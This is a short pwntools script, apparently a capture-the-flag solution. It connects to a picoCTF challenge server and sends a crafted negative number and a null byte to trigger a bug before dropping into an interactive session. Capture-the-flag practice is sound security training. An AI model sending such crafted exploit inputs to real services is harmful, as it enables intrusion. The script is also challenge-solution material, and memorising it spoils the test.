from pwn import *

io = remote('mercury.picoctf.net', 10097)

io.sendlineafter(b': ', b'-5144')
io.sendlineafter(b': ', b'\x00')
io.interactive()